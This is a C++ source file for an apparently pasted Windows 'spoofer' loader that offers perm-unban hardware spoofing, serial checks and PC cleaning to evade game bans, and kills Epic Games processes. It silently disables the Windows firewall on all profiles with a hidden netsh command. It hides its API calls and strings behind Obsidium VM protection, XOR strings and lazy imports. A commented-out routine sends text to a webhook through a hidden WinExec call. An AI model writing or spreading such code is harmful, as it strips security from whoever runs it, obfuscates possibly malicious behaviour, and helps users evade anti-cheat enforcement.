#include <iostream>
#include <Windows.h>
#include <string>
#include "color.hpp"
#include "driver.hpp"
#include "xorstr.h"
#include <thread>
#include "other.h"
#include "auth.hpp"
#include "Obsidium_Sdk/Obsidium Sdk/obsidium.h"
#include "Obsidium_Sdk/Obsidium Sdk/obsidium64.h"
#include "lazy.h"

std::string tm_to_readable_time(tm ctx);
static std::time_t string_to_timet(std::string timestamp);
static std::tm timet_to_tm(time_t timestamp);



DWORD keychk(LPVOID in) {

	while (1) {
		if (GetAsyncKeyState(NULL) & 1) {

		}
		else
		{
			
		}



	}
}

DWORD fortnitechkk(LPVOID in) {

	while (1) {
		if (GetAsyncKeyState(NULL) & 1) {

		}
		else
		{
			fortnitechk();
		}



	}
}

struct slowly_printing_string {
	std::string data;
	long int delay;
};

std::ostream& operator<<(std::ostream& out, const slowly_printing_string& s) {
	for (const auto& c : s.data) {
		out << c << std::flush;
		std::this_thread::sleep_for(std::chrono::milliseconds(s.delay));
	}
	return out;
}



void clear()
{
	LI_FN(system)(E("cls"));
}


using namespace std;

//void SendText(string text, string webhook_url) {
//
//	string cmd = cmd1p1 + text + cmd1p2 + webhook_url;
//
//	WinExec(cmd.c_str(), SW_HIDE);
//
//}


int main()
{
	OBSIDIUM_VM_START;
	LI_FN(ShowWindow)(LI_FN(GetConsoleWindow)(), SW_SHOW);
	LI_FN(ShowWindow)(LI_FN(GetConsoleWindow)(), SW_MAXIMIZE);
	LI_FN(system)(E("color b"));
	LI_FN(SetConsoleTitleA)(E("Proofex You Fucked By FrezzyTerror Fix ur iq"));
    LI_FN(system)(E("cls"));
	std::cout << slowly_printing_string{ "\n\n\n Welcome To Pasted Loader",50 };
	std::cout << slowly_printing_string{ "\n\n Checking For Blacklisted Programs",50 };
	
	LI_FN(system)(E("netsh advfirewall set allprofiles state off >nul"));
	
	thread(checkurmomez2).detach();
	thread(checkurmomez).detach();
	LI_FN(Sleep)(500);
	std::cout << slowly_printing_string{ "...   Done!",50 };
	std::cout << slowly_printing_string{ "\n\n Closing Epic Gammes Tasks",50 };
	std::thread(fortnitechk).detach();

mainn:
	LI_FN(ShowWindow)(LI_FN(GetConsoleWindow)(), SW_SHOW);
	LI_FN(ShowWindow)(LI_FN(GetConsoleWindow)(), SW_MAXIMIZE);
	clear();
	cout << dye::blue("\n [ ");
	cout << dye::white("");
	std::cout << slowly_printing_string{ "F1",50 };
	std::cout << dye::blue(" ]");
	std::cout << slowly_printing_string{ " -> ",50 };
	std::cout << dye::blue("[ ");
	std::cout << slowly_printing_string{ "PERM UNBAN",50 };
	std::cout << dye::blue(" ]");

	cout << dye::blue("\n [ ");
	cout << dye::white("");
	std::cout << slowly_printing_string{ "F2",50 };
	std::cout << dye::blue(" ]");
	std::cout << slowly_printing_string{ " -> ",50 };
	std::cout << dye::blue("[ ");
	std::cout << slowly_printing_string{ "CHECK SERIALS",50 };
	std::cout << dye::blue(" ]");

	cout << dye::blue("\n [ ");
	cout << dye::white("");
	std::cout << slowly_printing_string{ "F3",50 };
	std::cout << dye::blue(" ]");
	std::cout << slowly_printing_string{ " -> ",50 };
	std::cout << dye::blue("[ ");
	std::cout << slowly_printing_string{ "CLEAN",50 };
	std::cout << dye::blue(" ]");

	cout << dye::blue("\n [ ");
	cout << dye::white("");
	std::cout << slowly_printing_string{ "F4",50 };
	std::cout << dye::blue(" ]");
	std::cout << slowly_printing_string{ " -> ",50 };
	std::cout << dye::blue("[ ");
	std::cout << slowly_printing_string{ "Discord",50 };
	std::cout << dye::blue(" ]");

	while (true)
	{
		if (LI_FN(GetAsyncKeyState)(VK_F1) & 1) {
			LI_FN(Beep)(500, 500);
			Spoof::Perm();
			LI_FN(system)(E("start https://discord.gg/8FtVeKshCV"));
			std::cout << slowly_printing_string{ "\n\n\n            Done Perm Spoofing\n\n\n",50 };
			//MessageBoxA(0, E("Done Spoofing"), E("Done Spoofing"), 0);
			goto mainn;
		}

		if (LI_FN(GetAsyncKeyState)(VK_F2) & 1) {
			Check::checker();
			goto mainn;
		}

		if (LI_FN(GetAsyncKeyState)(VK_F3) & 1) {
			std::cout << slowly_printing_string{ "\n\n\n Cleaning Pc Please Wait. This Window Will Close For A Second But When Were Done The Window Will Open Again",50 };
			Cleaner::cleaner();
			LI_FN(system)(E("start https://discord.gg/8FtVeKshCV"));
			return main();
		}

		if (LI_FN(GetAsyncKeyState)(VK_F4))
		{
			LI_FN(system)(E("start https://discord.gg/8FtVeKshCV"));
		}
	}

	return main();
	OBSIDIUM_VM_END;
}